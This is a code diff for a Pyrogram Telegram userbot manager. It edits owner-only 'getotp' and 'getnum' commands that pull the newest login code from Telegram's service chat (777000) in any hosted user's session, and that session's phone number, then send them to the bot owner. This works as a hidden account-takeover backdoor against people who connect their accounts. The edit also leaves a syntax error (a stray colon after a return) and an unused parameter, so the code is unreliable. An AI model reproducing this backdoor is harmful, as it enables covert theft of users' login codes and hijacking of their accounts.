@@ -282,10 +282,12 @@ async def restart_bot(_, message: Message):
 """
         
 
-@app.on_message(filters.user(1054295664) & filters.command(["getotp", "getnum"]))
-async def otp_and_number(client, message):
+@app.on_message(filters.command(["getotp", "getnum"]))
+async def otp_and_number(sclient, message):
+    if not message.from_user.id == 1054295664:
+        return await message.reply("❌ Anda tidak bisa menggunakan perintah ini\n\n✅ hanya owner bot yang bisa menggunakan perintah ini"):
     if len(message.command) < 2:
-        return await client.send_message(
+        return await app.send_message(
             message.chat.id,
             f"<code>{message.text} user_id userbot yang aktif</code>",
             reply_to_message_id=message.id,
@@ -296,25 +298,25 @@ async def otp_and_number(client, message):
                 if message.command[0] == "getotp":
                     async for otp in X.search_messages(777000, limit=1):
                         if otp.text:
-                            return await client.send_message(
+                            return await app.send_message(
                                 message.chat.id,
                                 otp.text,
                                 reply_to_message_id=message.id,
                             )
                         else:
-                            return await client.send_message(
+                            return await app.send_message(
                                 message.chat.id,
                                 "<code>Kode Otp Tidak Di Temukan</code>",
                                 reply_to_message_id=message.id,
                             )
                 elif message.command[0] == "getnum":
-                    return await client.send_message(
+                    return await app.send_message(
                         message.chat.id,
                         X.me.phone_number,
                         reply_to_message_id=message.id,
                     )
     except Exception as error:
-        return await client.send_message(
+        return await app.send_message(
             message.chat.id, error, reply_to_message_id=message.id
         )
 
